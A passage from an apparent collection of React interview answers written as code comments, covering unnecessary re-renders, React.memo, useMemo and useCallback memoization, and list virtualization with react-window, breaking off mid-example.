4. Inline Styles and Objects
-----------------------------

function Parent() {
  const [count, setCount] = useState(0);
  
  return (
    <div>
      <button onClick={() => setCount(count + 1)}>Count: {count}</button>
      
      {/* ❌ Bad: New style object on every render * /}
      <Child style={{ color: 'red', fontSize: '16px' }} />
    </div>
  );
}

// ✅ Solution: Define outside or use useMemo
const childStyle = { color: 'red', fontSize: '16px' };

function Parent() {
  const [count, setCount] = useState(0);
  
  return (
    <div>
      <button onClick={() => setCount(count + 1)}>Count: {count}</button>
      <Child style={childStyle} />
    </div>
  );
}

5. Context Changes
------------------

const UserContext = createContext();

function App() {
  const [user, setUser] = useState({ name: 'John' });
  
  // Every time user changes, ALL consumers re-render
  return (
    <UserContext.Provider value={user}>
      <Header />      {/* Re-renders if uses context * /}
      <Sidebar />     {/* Re-renders if uses context * /}
      <Content />     {/* Re-renders if uses context * /}
      <Footer />      {/* Re-renders if uses context * /}
    </UserContext.Provider>
  );
}

// ✅ Solution: Split contexts or memoize value
function App() {
  const [user, setUser] = useState({ name: 'John' });
  
  // Memoize context value
  const value = useMemo(() => ({ user, setUser }), [user]);
  
  return (
    <UserContext.Provider value={value}>
      {/* ... * /}
    </UserContext.Provider>
  );
}

6. Using Index as Key
---------------------

function TodoList({ todos }) {
  return (
    <ul>
      {/* ❌ Bad: Using index as key * /}
      {todos.map((todo, index) => (
        <TodoItem key={index} todo={todo} />
      ))}
    </ul>
  );
}

// When you add/remove items, indices change, causing unnecessary re-renders

// ✅ Solution: Use stable unique IDs
function TodoList({ todos }) {
  return (
    <ul>
      {todos.map(todo => (
        <TodoItem key={todo.id} todo={todo} />
      ))}
    </ul>
  );
}

7. State in Wrong Component
----------------------------

// ❌ Bad: State at top level affects all siblings
function App() {
  const [isModalOpen, setIsModalOpen] = useState(false);
  
  return (
    <div>
      <HeavyComponent1 />  {/* Re-renders when modal state changes * /}
      <HeavyComponent2 />  {/* Re-renders when modal state changes * /}
      <HeavyComponent3 />  {/* Re-renders when modal state changes * /}
      <Modal isOpen={isModalOpen} onClose={() => setIsModalOpen(false)} />
    </div>
  );
}

// ✅ Solution: Move state closer to where it's used
function App() {
  return (
    <div>
      <HeavyComponent1 />
      <HeavyComponent2 />
      <HeavyComponent3 />
      <ModalManager />  {/* State contained here * /}
    </div>
  );
}

function ModalManager() {
  const [isModalOpen, setIsModalOpen] = useState(false);
  
  return (
    <>
      <button onClick={() => setIsModalOpen(true)}>Open Modal</button>
      <Modal isOpen={isModalOpen} onClose={() => setIsModalOpen(false)} />
    </>
  );
}

8. Passing Entire Objects When Only Part is Needed
---------------------------------------------------

// ❌ Bad: Passing entire user object
function Parent() {
  const [user, setUser] = useState({ name: 'John', age: 30, email: 'john@example.com' });
  
  return <Child user={user} />;
}

const Child = React.memo(function Child({ user }) {
  return <div>{user.name}</div>; {/* Only uses name * /}
});

// Child re-renders when any part of user changes

// ✅ Solution: Pass only what's needed
function Parent() {
  const [user, setUser] = useState({ name: 'John', age: 30, email: 'john@example.com' });
  
  return <Child name={user.name} />;
}

const Child = React.memo(function Child({ name }) {
  return <div>{name}</div>;
});

// Now child only re-renders when name changes

9. Anonymous JSX Components
----------------------------

function Parent() {
  const [count, setCount] = useState(0);
  
  // ❌ Bad: Component defined inside render
  const ChildComponent = () => <div>Child</div>;
  
  return (
    <div>
      <button onClick={() => setCount(count + 1)}>Count: {count}</button>
      <ChildComponent /> {/* New component every render! * /}
    </div>
  );
}

// ✅ Solution: Define component outside
const ChildComponent = () => <div>Child</div>;

function Parent() {
  const [count, setCount] = useState(0);
  
  return (
    <div>
      <button onClick={() => setCount(count + 1)}>Count: {count}</button>
      <ChildComponent />
    </div>
  );
}

10. Props Spreading with Extra Props
-------------------------------------

function Parent() {
  const [count, setCount] = useState(0);
  
  const props = {
    name: 'John',
    age: 30,
    onClick: () => console.log('clicked') // New function every render!
  };
  
  return (
    <div>
      <button onClick={() => setCount(count + 1)}>Count: {count}</button>
      <Child {...props} />
    </div>
  );
}

// ✅ Solution: Memoize props object or individual props
function Parent() {
  const [count, setCount] = useState(0);
  
  const onClick = useCallback(() => console.log('clicked'), []);
  
  const props = useMemo(() => ({
    name: 'John',
    age: 30,
    onClick
  }), [onClick]);
  
  return (
    <div>
      <button onClick={() => setCount(count + 1)}>Count: {count}</button>
      <Child {...props} />
    </div>
  );
}

Detecting Unnecessary Re-renders:
----------------------------------

// Method 1: Console logs
function MyComponent({ name }) {
  console.log('MyComponent rendered');
  return <div>{name}</div>;
}

// Method 2: React DevTools Profiler
// 1. Open React DevTools
// 2. Go to Profiler tab
// 3. Start recording
// 4. Interact with app
// 5. Stop recording
// 6. See which components rendered and why

// Method 3: why-did-you-render library
import whyDidYouRender from '@welldone-software/why-did-you-render';

whyDidYouRender(React, {
  trackAllPureComponents: true,
});

function MyComponent({ name }) {
  return <div>{name}</div>;
}
MyComponent.whyDidYouRender = true;

// Method 4: Custom hook
function useWhyDidYouUpdate(name, props) {
  const previousProps = useRef();
  
  useEffect(() => {
    if (previousProps.current) {
      const allKeys = Object.keys({ ...previousProps.current, ...props });
      const changedProps = {};
      
      allKeys.forEach(key => {
        if (previousProps.current[key] !== props[key]) {
          changedProps[key] = {
            from: previousProps.current[key],
            to: props[key]
          };
        }
      });
      
      if (Object.keys(changedProps).length > 0) {
        console.log('[why-did-you-update]', name, changedProps);
      }
    }
    
    previousProps.current = props;
  });
}

// Usage
function MyComponent(props) {
  useWhyDidYouUpdate('MyComponent', props);
  return <div>{props.name}</div>;
}

Summary of Solutions:
---------------------

1. Use React.memo for pure components
2. Use useMemo for expensive calculations and object props
3. Use useCallback for function props
4. Move state closer to where it's used
5. Split contexts when they change frequently
6. Use stable keys (not indices)
7. Define objects/arrays/functions outside render
8. Pass only needed props to children
9. Define components outside render
10. Use React DevTools Profiler to identify issues

Best Practices:
---------------

✅ DO:
- Use React.memo for expensive pure components
- Use useMemo/useCallback when passing to memoized children
- Keep state as local as possible
- Use stable keys
- Profile before optimizing

❌ DON'T:
- Optimize prematurely
- Memo everything (adds overhead)
- Worry about cheap re-renders
- Use index as key for dynamic lists
- Create functions/objects in render
*/


/**
65. What is React.memo and when should you use it?
--------------------------------------------------

React.memo is a higher-order component that memoizes a component, preventing
re-renders when props haven't changed. It does a shallow comparison of props.

Purpose:
- Prevent unnecessary re-renders
- Optimize performance for expensive components
- Memoize pure components

Basic Usage:
------------

// Without React.memo
function ExpensiveComponent({ name, age }) {
  console.log('ExpensiveComponent rendered');
  
  // Expensive computation
  const result = expensiveCalculation(age);
  
  return (
    <div>
      <p>Name: {name}</p>
      <p>Age: {age}</p>
      <p>Result: {result}</p>
    </div>
  );
}

// Parent
function Parent() {
  const [count, setCount] = useState(0);
  const [name, setName] = useState('John');
  
  return (
    <div>
      <button onClick={() => setCount(count + 1)}>Count: {count}</button>
      <ExpensiveComponent name={name} age={30} />
      {/* Re-renders on every count change! * /}
    </div>
  );
}

// With React.memo
const ExpensiveComponent = React.memo(function ExpensiveComponent({ name, age }) {
  console.log('ExpensiveComponent rendered');
  
  const result = expensiveCalculation(age);
  
  return (
    <div>
      <p>Name: {name}</p>
      <p>Age: {age}</p>
      <p>Result: {result}</p>
    </div>
  );
});

// Now only re-renders when name or age changes

Alternative Syntax:
-------------------

// Method 1: Wrap function component
const MemoizedComponent = React.memo(MyComponent);

// Method 2: Wrap inline
export default React.memo(function MyComponent(props) {
  return <div>{props.name}</div>;
});

// Method 3: With named function
function MyComponent(props) {
  return <div>{props.name}</div>;
}

export default React.memo(MyComponent);

Custom Comparison Function:
----------------------------

// By default, React.memo does shallow comparison
// You can provide custom comparison for deep comparison

const MyComponent = React.memo(
  function MyComponent({ user, settings }) {
    return (
      <div>
        <p>{user.name}</p>
        <p>{settings.theme}</p>
      </div>
    );
  },
  (prevProps, nextProps) => {
    // Return true if props are equal (skip re-render)
    // Return false if props are different (re-render)
    
    return (
      prevProps.user.name === nextProps.user.name &&
      prevProps.settings.theme === nextProps.settings.theme
    );
  }
);

// Custom comparison examples:

// Compare by ID only
const UserCard = React.memo(
  UserCardComponent,
  (prev, next) => prev.user.id === next.user.id
);

// Deep comparison (use with caution - expensive!)
const ComplexComponent = React.memo(
  ComplexComponentComponent,
  (prev, next) => JSON.stringify(prev) === JSON.stringify(next)
);

// Ignore certain props
const PartialCompareComponent = React.memo(
  Component,
  (prev, next) => {
    // Only compare these props, ignore others
    return (
      prev.id === next.id &&
      prev.name === next.name
      // Ignore prev.timestamp !== next.timestamp
    );
  }
);

When to Use React.memo:
-----------------------

✅ Use React.memo when:

1. Component renders often with same props
   
function Parent() {
  const [count, setCount] = useState(0);
  
  return (
    <div>
      <button onClick={() => setCount(count + 1)}>Count: {count}</button>
      {/* Always receives same props but parent re-renders frequently * /}
      <ExpensiveList items={staticItems} />
    </div>
  );
}

const ExpensiveList = React.memo(function ExpensiveList({ items }) {
  return items.map(item => <ExpensiveItem key={item.id} item={item} />);
});

2. Component is expensive to render

const HeavyChart = React.memo(function HeavyChart({ data }) {
  // Complex D3.js visualization
  // Heavy calculations
  // Many DOM elements
  
  return <svg>{/* ... * /}</svg>;
});

3. Component is pure (same props = same output)

const PureComponent = React.memo(function PureComponent({ name, age }) {
  // No side effects
  // No random values
  // No Date.now()
  // No Math.random()
  
  return <div>{name} is {age} years old</div>;
});

4. Component is in a list

const TodoItem = React.memo(function TodoItem({ todo, onToggle }) {
  return (
    <li onClick={() => onToggle(todo.id)}>
      {todo.text}
    </li>
  );
});

function TodoList({ todos, onToggle }) {
  return (
    <ul>
      {todos.map(todo => (
        <TodoItem key={todo.id} todo={todo} onToggle={onToggle} />
      ))}
    </ul>
  );
}

When NOT to Use React.memo:
---------------------------

❌ Don't use React.memo when:

1. Props change frequently

function Parent() {
  const [time, setTime] = useState(Date.now());
  
  useEffect(() => {
    const timer = setInterval(() => setTime(Date.now()), 1000);
    return () => clearInterval(timer);
  }, []);
  
  // ❌ Bad: Props change every second, memo adds overhead
  return <MemoizedClock time={time} />;
}

2. Component is already fast to render

// ❌ Bad: Unnecessary memo for simple component
const SimpleText = React.memo(function SimpleText({ text }) {
  return <p>{text}</p>;
});

// Simple components are fast, memo adds overhead

3. Props include functions/objects not memoized

function Parent() {
  const [count, setCount] = useState(0);
  
  // ❌ Bad: New function every render, memo useless
  return (
    <MemoizedChild
      onClick={() => console.log('clicked')}
      data={{ count }}
    />
  );
}

// Memo won't help because props always change (new references)

4. Component always needs to re-render anyway

// ❌ Bad: Component uses context that changes frequently
const MemoizedComponent = React.memo(function Component({ name }) {
  const value = useContext(FrequentlyChangingContext);
  return <div>{name} - {value}</div>;
});

// Context changes trigger re-render regardless of memo

React.memo with Hooks:
----------------------

// Correct usage with useCallback and useMemo

function Parent() {
  const [count, setCount] = useState(0);
  const [items, setItems] = useState([]);
  
  // ✅ Memoize callback
  const handleClick = useCallback((id) => {
    console.log('Clicked:', id);
  }, []);
  
  // ✅ Memoize object/array
  const config = useMemo(() => ({
    theme: 'dark',
    fontSize: 16
  }), []);
  
  return (
    <div>
      <button onClick={() => setCount(count + 1)}>Count: {count}</button>
      
      {/* Child only re-renders when items change * /}
      <MemoizedList items={items} onClick={handleClick} config={config} />
    </div>
  );
}

const MemoizedList = React.memo(function List({ items, onClick, config }) {
  return items.map(item => (
    <div key={item.id} onClick={() => onClick(item.id)}>
      {item.name}
    </div>
  ));
});

Common Pitfalls:
----------------

// Pitfall 1: Inline object prop
const MemoChild = React.memo(Child);

function Parent() {
  return (
    <div>
      {/* ❌ New object every render, memo useless * /}
      <MemoChild config={{ theme: 'dark' }} />
    </div>
  );
}

// Fix:
const config = { theme: 'dark' };

function Parent() {
  return <MemoChild config={config} />;
}

// Pitfall 2: Inline function prop
function Parent() {
  return (
    <div>
      {/* ❌ New function every render, memo useless * /}
      <MemoChild onClick={() => console.log('click')} />
    </div>
  );
}

// Fix:
function Parent() {
  const handleClick = useCallback(() => console.log('click'), []);
  return <MemoChild onClick={handleClick} />;
}

// Pitfall 3: Children prop
function Parent() {
  return (
    <MemoChild>
      {/* ❌ Children are new every render * /}
      <div>Content</div>
    </MemoChild>
  );
}

// Fix: Extract children to separate memoized component
const Content = React.memo(function Content() {
  return <div>Content</div>;
});

function Parent() {
  return (
    <MemoChild>
      <Content />
    </MemoChild>
  );
}

Real-World Example:
-------------------

// Product card in a list
const ProductCard = React.memo(
  function ProductCard({ product, onAddToCart }) {
    console.log('ProductCard rendered:', product.id);
    
    return (
      <div className="product-card">
        <img src={product.image} alt={product.name} />
        <h3>{product.name}</h3>
        <p>${product.price}</p>
        <button onClick={() => onAddToCart(product.id)}>
          Add to Cart
        </button>
      </div>
    );
  },
  // Custom comparison: only re-render if product data changed
  (prevProps, nextProps) => {
    return (
      prevProps.product.id === nextProps.product.id &&
      prevProps.product.name === nextProps.product.name &&
      prevProps.product.price === nextProps.product.price &&
      prevProps.product.image === nextProps.product.image
    );
  }
);

function ProductList({ products }) {
  const [cart, setCart] = useState([]);
  
  // Memoize callback so ProductCard memo works
  const handleAddToCart = useCallback((productId) => {
    setCart(prev => [...prev, productId]);
  }, []);
  
  return (
    <div className="product-grid">
      {products.map(product => (
        <ProductCard
          key={product.id}
          product={product}
          onAddToCart={handleAddToCart}
        />
      ))}
    </div>
  );
}

Measuring Performance:
----------------------

// Use React DevTools Profiler to measure impact

function App() {
  return (
    <Profiler id="ProductList" onRender={onRenderCallback}>
      <ProductList products={products} />
    </Profiler>
  );
}

function onRenderCallback(
  id,
  phase,
  actualDuration,
  baseDuration,
  startTime,
  commitTime
) {
  console.log(`${id} (${phase}) took ${actualDuration}ms`);
}

// Compare with and without React.memo

Summary:

React.memo:
- HOC that memoizes components
- Prevents re-renders when props unchanged
- Does shallow comparison by default
- Can provide custom comparison function
- Use for expensive pure components
- Must memoize function/object props too
- Don't overuse (adds overhead)
- Profile to measure impact
- Alternative to PureComponent for function components
*/


/**
66. What is memoization in React and how does it work?
------------------------------------------------------

Memoization is an optimization technique that caches the result of expensive
function calls and returns the cached result when the same inputs occur again.

In React, memoization prevents:
- Unnecessary re-renders (React.memo)
- Expensive recalculations (useMemo)
- Function recreations (useCallback)

React Memoization Tools:
------------------------

1. React.memo - Memoize components
2. useMemo - Memoize values/calculations
3. useCallback - Memoize functions

How Memoization Works:
----------------------

// Concept: Cache results based on inputs

// Without memoization
function expensiveCalculation(num) {
  console.log('Calculating...');
  let result = 0;
  for (let i = 0; i < 1000000000; i++) {
    result += num;
  }
  return result;
}

// Every call recalculates
expensiveCalculation(5); // Calculating... (takes time)
expensiveCalculation(5); // Calculating... (takes time again!)
expensiveCalculation(5); // Calculating... (takes time again!)

// With memoization
const memoizedCalculation = (() => {
  const cache = {};
  
  return (num) => {
    if (cache[num]) {
      console.log('From cache');
      return cache[num];
    }
    
    console.log('Calculating...');
    let result = 0;
    for (let i = 0; i < 1000000000; i++) {
      result += num;
    }
    
    cache[num] = result;
    return result;
  };
})();

memoizedCalculation(5); // Calculating... (takes time)
memoizedCalculation(5); // From cache (instant!)
memoizedCalculation(5); // From cache (instant!)

1. useMemo - Memoize Values:
-----------------------------

// Syntax: useMemo(calculateValue, dependencies)

function SearchResults({ query, items }) {
  // Without useMemo - filters on EVERY render
  const filteredItems = items.filter(item =>
    item.name.toLowerCase().includes(query.toLowerCase())
  );
  
  return <List items={filteredItems} />;
}

// With useMemo - only filters when query or items change
function SearchResults({ query, items }) {
  const filteredItems = useMemo(() => {
    console.log('Filtering...');
    return items.filter(item =>
      item.name.toLowerCase().includes(query.toLowerCase())
    );
  }, [query, items]);
  
  return <List items={filteredItems} />;
}

// useMemo Examples:

// Example 1: Expensive calculation
function ProductList({ products, category }) {
  const filteredProducts = useMemo(() => {
    console.log('Filtering products...');
    return products.filter(p => p.category === category);
  }, [products, category]);
  
  const totalPrice = useMemo(() => {
    console.log('Calculating total...');
    return filteredProducts.reduce((sum, p) => sum + p.price, 0);
  }, [filteredProducts]);
  
  return (
    <div>
      <h2>Total: ${totalPrice}</h2>
      {filteredProducts.map(p => <Product key={p.id} product={p} />)}
    </div>
  );
}

// Example 2: Sorting
function SortedList({ items, sortBy }) {
  const sortedItems = useMemo(() => {
    console.log('Sorting...');
    return [...items].sort((a, b) => {
      if (sortBy === 'name') return a.name.localeCompare(b.name);
      if (sortBy === 'price') return a.price - b.price;
      return 0;
    });
  }, [items, sortBy]);
  
  return sortedItems.map(item => <Item key={item.id} item={item} />);
}

// Example 3: Object for React.memo
function Parent() {
  const [count, setCount] = useState(0);
  
  // Without useMemo: new object every render
  const config = { theme: 'dark', fontSize: 16 };
  
  // With useMemo: same object reference
  const config = useMemo(() => ({
    theme: 'dark',
    fontSize: 16
  }), []); // Empty deps = created once
  
  return (
    <div>
      <button onClick={() => setCount(count + 1)}>Count: {count}</button>
      <MemoizedChild config={config} />
    </div>
  );
}

const MemoizedChild = React.memo(function Child({ config }) {
  console.log('Child rendered');
  return <div>{config.theme}</div>;
});

2. useCallback - Memoize Functions:
------------------------------------

// Syntax: useCallback(function, dependencies)

// Without useCallback
function Parent() {
  const [count, setCount] = useState(0);
  
  // New function created every render
  const handleClick = () => {
    console.log('Clicked');
  };
  
  return (
    <div>
      <button onClick={() => setCount(count + 1)}>Count: {count}</button>
      <MemoizedChild onClick={handleClick} />
    </div>
  );
}

// With useCallback
function Parent() {
  const [count, setCount] = useState(0);
  
  // Same function reference across renders
  const handleClick = useCallback(() => {
    console.log('Clicked');
  }, []); // Empty deps = function never changes
  
  return (
    <div>
      <button onClick={() => setCount(count + 1)}>Count: {count}</button>
      <MemoizedChild onClick={handleClick} />
    </div>
  );
}

// useCallback Examples:

// Example 1: With dependencies
function TodoList({ todos }) {
  const [filter, setFilter] = useState('all');
  
  // Function recreated when filter changes
  const handleToggle = useCallback((id) => {
    console.log('Toggle todo:', id, 'Filter:', filter);
    toggleTodo(id);
  }, [filter]); // Recreate when filter changes
  
  return todos.map(todo => (
    <TodoItem key={todo.id} todo={todo} onToggle={handleToggle} />
  ));
}

// Example 2: Event handlers
function Form() {
  const [formData, setFormData] = useState({ name: '', email: '' });
  
  const handleNameChange = useCallback((e) => {
    setFormData(prev => ({ ...prev, name: e.target.value }));
  }, []); // No deps, uses functional update
  
  const handleEmailChange = useCallback((e) => {
    setFormData(prev => ({ ...prev, email: e.target.value }));
  }, []);
  
  return (
    <form>
      <MemoizedInput value={formData.name} onChange={handleNameChange} />
      <MemoizedInput value={formData.email} onChange={handleEmailChange} />
    </form>
  );
}

// Example 3: Callback with access to state
function Counter() {
  const [count, setCount] = useState(0);
  
  // ❌ Without dependency: stale closure
  const handleIncrement = useCallback(() => {
    setCount(count + 1); // count is always 0!
  }, []); // Missing count dependency
  
  // ✅ With dependency
  const handleIncrement = useCallback(() => {
    setCount(count + 1);
  }, [count]); // Recreate when count changes
  
  // ✅ Better: Functional update (no dependency needed)
  const handleIncrement = useCallback(() => {
    setCount(prev => prev + 1);
  }, []); // No dependencies needed!
  
  return (
    <div>
      <p>Count: {count}</p>
      <button onClick={handleIncrement}>Increment</button>
    </div>
  );
}

useMemo vs useCallback:
-----------------------

// useCallback(fn, deps) is equivalent to useMemo(() => fn, deps)

// These are the same:
const memoizedCallback = useCallback(() => {
  doSomething(a, b);
}, [a, b]);

const memoizedCallback = useMemo(() => {
  return () => doSomething(a, b);
}, [a, b]);

// Use useCallback for functions
const handleClick = useCallback(() => {
  console.log('clicked');
}, []);

// Use useMemo for values
const expensiveValue = useMemo(() => {
  return computeExpensiveValue(a, b);
}, [a, b]);

When to Use Memoization:
-------------------------

✅ Use useMemo when:

1. Expensive calculations
   
const fibonacci = useMemo(() => {
  return calculateFibonacci(n); // Expensive recursive calculation
}, [n]);

2. Filtering/sorting large lists

const filteredList = useMemo(() => {
  return largeList.filter(item => item.category === category);
}, [largeList, category]);

3. Creating objects/arrays for memoized components

const config = useMemo(() => ({ theme, fontSize }), [theme, fontSize]);

✅ Use useCallback when:

1. Passing functions to memoized children

const handleClick = useCallback(() => {
  // handle click
}, []);

<MemoizedChild onClick={handleClick} />

2. Dependencies of other hooks

const fetchData = useCallback(() => {
  return fetch('/api/data');
}, []);

useEffect(() => {
  fetchData();
}, [fetchData]); // fetchData in dependency array

3. Event handlers for optimized components

const handleChange = useCallback((e) => {
  setValue(e.target.value);
}, []);

When NOT to Use Memoization:
-----------------------------

❌ Don't use when:

1. Calculation is cheap

// ❌ Overkill
const doubled = useMemo(() => value * 2, [value]);

// ✅ Just do it
const doubled = value * 2;

2. Dependencies change frequently

// ❌ Useless memoization
const result = useMemo(() => {
  return compute(a, b, c, d, e);
}, [a, b, c, d, e]); // All change frequently

3. Premature optimization

// ❌ Don't memoize everything
const Component = React.memo(function Component() {
  const value1 = useMemo(() => compute1(), []);
  const value2 = useMemo(() => compute2(), []);
  const value3 = useMemo(() => compute3(), []);
  // ... too much!
});

Real-World Example:
-------------------

function DataGrid({ data, sortBy, filterBy }) {
  // 1. Filter data (expensive for large datasets)
  const filteredData = useMemo(() => {
    console.log('Filtering data...');
    return data.filter(item => 
      item.category.includes(filterBy)
    );
  }, [data, filterBy]);
  
  // 2. Sort filtered data
  const sortedData = useMemo(() => {
    console.log('Sorting data...');
    return [...filteredData].sort((a, b) => {
      if (sortBy === 'name') return a.name.localeCompare(b.name);
      if (sortBy === 'price') return a.price - b.price;
      return 0;
    });
  }, [filteredData, sortBy]);
  
  // 3. Calculate statistics
  const stats = useMemo(() => {
    console.log('Calculating stats...');
    return {
      total: sortedData.length,
      avgPrice: sortedData.reduce((sum, item) => sum + item.price, 0) / sortedData.length,
      maxPrice: Math.max(...sortedData.map(item => item.price))
    };
  }, [sortedData]);
  
  // 4. Memoized event handlers
  const handleRowClick = useCallback((id) => {
    console.log('Row clicked:', id);
    navigateToDetail(id);
  }, []);
  
  const handleSort = useCallback((column) => {
    setSortBy(column);
  }, []);
  
  return (
    <div>
      <Stats {...stats} />
      <SortControls onSort={handleSort} />
      <Table data={sortedData} onRowClick={handleRowClick} />
    </div>
  );
}

// Memoized child components
const Stats = React.memo(function Stats({ total, avgPrice, maxPrice }) {
  return (
    <div>
      <p>Total: {total}</p>
      <p>Average: ${avgPrice.toFixed(2)}</p>
      <p>Max: ${maxPrice.toFixed(2)}</p>
    </div>
  );
});

const Table = React.memo(function Table({ data, onRowClick }) {
  return (
    <table>
      <tbody>
        {data.map(item => (
          <Row key={item.id} item={item} onClick={onRowClick} />
        ))}
      </tbody>
    </table>
  );
});

const Row = React.memo(function Row({ item, onClick }) {
  return (
    <tr onClick={() => onClick(item.id)}>
      <td>{item.name}</td>
      <td>${item.price}</td>
    </tr>
  );
});

Dependency Array Best Practices:
---------------------------------

// 1. Include all used values
const memoized = useMemo(() => {
  return a + b + c; // Use a, b, c
}, [a, b, c]); // Include a, b, c

// 2. Use ESLint rule
// eslint-plugin-react-hooks warns about missing dependencies

// 3. Empty array = computed once
const constant = useMemo(() => {
  return { theme: 'dark' };
}, []); // Never recomputed

// 4. No dependency array = computed every render
const alwaysNew = useMemo(() => {
  return { theme: 'dark' };
}); // Computed every render (useless!)

Summary:

Memoization in React:
- Cache results to avoid recalculation
- React.memo: Memoize components
- useMemo: Memoize values/calculations
- useCallback: Memoize functions
- Provide dependency array
- Only use for expensive operations
- Profile before optimizing
- Don't overuse (adds overhead)
- Essential for large apps/lists
*/


/**
67. What is virtualization and how does react-window or react-virtualized work?
-------------------------------------------------------------------------------

Virtualization (or windowing) is a technique that renders only the visible portion
of a large list, dramatically improving performance. Instead of rendering 10,000 items,
you render only ~20 visible items.

Problem Without Virtualization:
--------------------------------

function LargeList() {
  const items = Array.from({ length: 10000 }, (_, i) => `Item ${i}`);
  
  return (
    <div style={{ height: '400px', overflow: 'auto' }}>
      {items.map((item, index) => (
        <div key={index} style={{ height: '50px' }}>
          {item}
        </div>
      ))}
    </div>
  );
}

// Problems:
// - Renders 10,000 DOM nodes
// - Initial render: slow
// - Memory usage: high
// - Scrolling: janky
// - Browser struggles with large DOM

Solution: Virtualization
-------------------------

// Only render visible items (~20)
// Total items: 10,000
// Visible items: 20
// DOM nodes: 20 (instead of 10,000!)

react-window:
-------------

Lightweight library (3KB) for virtualizing lists and grids.

Installation:
npm install react-window

Basic FixedSizeList:
--------------------

import { FixedSizeList } from 'react-window';

function VirtualizedList() {
  const items = Array.from({ length: 10000 }, (_, i) => `Item ${i}`);
  
  // Row component
  const Row = ({ index, style }) => (
    <div style={style}>
      {items[index]}
    </div>
  );
  
  return (
    <FixedSizeList
      height={400}        // Container height
      itemCount={10000}   // Total number of items
      itemSize={50}       // Height of each item
      width="100%"        // Container width
    >
      {Row}
    </FixedSizeList>
  );
}

// Only renders ~8 items (400px / 50px per item)
// Plus buffer items for smooth scrolling

VariableSizeList:
-----------------

// Items with different heights

import { VariableSizeList } from 'react-window';

function VariableList() {
  const items = Array.from({ length: 1000 }, (_, i) => ({
    id: i,
    text: `Item ${i}`,
    height: 50 + Math.random() * 100 // Random height 50-150px
  }));
  
  const Row = ({ index, style }) => (
    <div style={style}>
      {items[index].text}
    </div>
  );
  
  // Function that returns height for each item
  const getItemSize = (index) => items[index].height;
  
  return (
    <VariableSizeList
      height={400}
      itemCount={items.length}
      itemSize={getItemSize}  // Function
      width="100%"
    >
      {Row}
    </VariableSizeList>
  );
}

FixedSizeGrid:
--------------

// 2D virtualization (rows and columns)

import { FixedSizeGrid } from 'react-window';

function VirtualizedGrid() {
  const Cell = ({ columnIndex, rowIndex, style }) => (
    <div style={style}>
      Cell {rowIndex},{columnIndex}
    </div>
  );
  
  return (
    <FixedSizeGrid
      columnCount={1000}    // Number of columns
      columnWidth={100}     // Width of each column
      height={400}          // Container height
      rowCount={1000}       // Number of rows
      rowHeight={50}        // Height of each row
      width={600}           // Container width
    >
      {Cell}
    </FixedSizeGrid>
  );
}

// Renders only visible cells (not all 1,000,000 cells!)

How It Works:
-------------

// Conceptual implementation

function VirtualList({ items, itemHeight, containerHeight }) {
  const [scrollTop, setScrollTop] = useState(0);
  
  // Calculate visible range
  const startIndex = Math.floor(scrollTop / itemHeight);
  const endIndex = Math.ceil((scrollTop + containerHeight) / itemHeight);
  
  // Add buffer for smooth scrolling
  const visibleItems = items.slice(
    Math.max(0, startIndex - 5),
    Math.min(items.length, endIndex + 5)
  );
  
  // Total height of all items
  const totalHeight = items.length * itemHeight;
  
  // Offset for visible items
  const offsetY = Math.max(0, startIndex - 5) * itemHeight;
  
  return (
    <div
      style={{ height: containerHeight, overflow: 'auto' }}
      onScroll={(e) => setScrollTop(e.target.scrollTop)}
    >
      {/* Spacer to maintain scroll height * /}
      <div style={{ height: totalHeight, position: 'relative' }}>
        {/* Render only visible items * /}
        <div style={{ transform: `translateY(${offsetY}px)` }}>
          {visibleItems.map((item, i) => (
            <div key={startIndex + i} style={{ height: itemHeight }}>
              {item}
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}

Real-World Example with Styling:
---------------------------------

import { FixedSizeList } from 'react-window';

function UserList({ users }) {
  const Row = ({ index, style }) => {
    const user = users[index];
    
    return (
      <div
        style={{
          ...style,
          display: 'flex',
          alignItems: 'center',
          padding: '10px',
          borderBottom: '1px solid #eee'
        }}
      >
        <img
          src={user.avatar}
          alt={user.name}
          style={{ width: 40, height: 40, borderRadius: '50%', marginRight: 10 }}
        />
        <div>
          <div style={{ fontWeight: 'bold' }}>{user.name}</div>
          <div style={{ fontSize: '0.875rem', color: '#666' }}>{user.email}</div>
        </div>
      </div>
    );
  };
  
  return (
    <FixedSizeList
      height={600}
      itemCount={users.length}
      itemSize={70}
      width="100%"
    >
      {Row}
    </FixedSizeList>
  );
}

Infinite Loading:
-----------------

import { FixedSizeList } from 'react-window';
import InfiniteLoader from 'react-window-infinite-loader';

function InfiniteList() {
  const [items, setItems] = useState([]);
  const [hasNextPage, setHasNextPage] = useState(true);
  
  const loadMoreItems = async (startIndex, stopIndex) => {
    const newItems = await fetchItems(startIndex, stopIndex);
    setItems(prev => [...prev, ...newItems]);
    
    if (newItems.length === 0) {
      setHasNextPage(false);
    }
  };
  
  const isItemLoaded = (index) => !hasNextPage || index < items.length;
  
  const Row = ({ index, style }) => {
    if (!isItemLoaded(index)) {
      return <div style={style}>Loading...</div>;
    }
    
    return <div style={style}>{items[index]}</div>;
  };
  
  return (
    <InfiniteLoader
      isItemLoaded={isItemLoaded}
      itemCount={hasNextPage ? items.length + 1 : items.length}
      loadMoreItems={loadMoreItems}
    >
      {({ onItemsRendered, ref }) => (
        <FixedSizeList
          height={400}
          itemCount={hasNextPage ? items.length + 1 : items.length}
          itemSize={50}
          onItemsRendered={onItemsRendered}
          ref={ref}
          width="100%"
        >
          {Row}
        </FixedSizeList>
      )}
    </InfiniteLoader>
  );
}

Scrolling to Item:
------------------

import { useRef } from 'react';
import { FixedSizeList } from 'react-window';

function ScrollableList() {
  const listRef = useRef();
  
  const scrollToItem = (index) => {
    listRef.current.scrollToItem(index, 'center');
  };
  
  const scrollToTop = () => {
    listRef.current.scrollTo(0);
  };
  
  return (
    <div>
      <button onClick={() => scrollToItem(500)}>Go to item 500</button>
      <button onClick={scrollToTop}>Scroll to top</button>
      
      <FixedSizeList
        ref={listRef}
        height={400}
        itemCount={1000}
        itemSize={50}
        width="100%"
      >
        {Row}
      </FixedSizeList>
    </div>
  );
}

Dynamic Content Height:
-----------------------

// For variable content height
import AutoSizer from 'react-virtualized-auto-sizer';
import { FixedSizeList } from 'react-window';

function ResponsiveList() {
  return (
    <AutoSizer>
      {({ height, width }) => (
        <FixedSizeList
          height={height}
          itemCount={1000}
          itemSize={50}
          width={width}
        >
          {Row}
        </FixedSizeList>
      )}
    </AutoSizer>
  );
}

Sticky Headers:
---------------

import { FixedSizeList } from 'react-window';

function ListWithStickyHeaders() {
